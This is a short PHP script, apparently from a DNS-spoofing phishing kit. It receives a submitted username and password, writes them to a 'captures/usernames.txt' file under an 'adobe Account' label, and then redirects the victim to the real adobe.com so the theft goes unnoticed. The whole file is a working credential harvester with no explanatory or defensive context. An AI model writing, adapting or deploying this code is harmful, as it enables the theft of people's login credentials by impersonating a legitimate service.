<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "adobe Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.com');
exit();
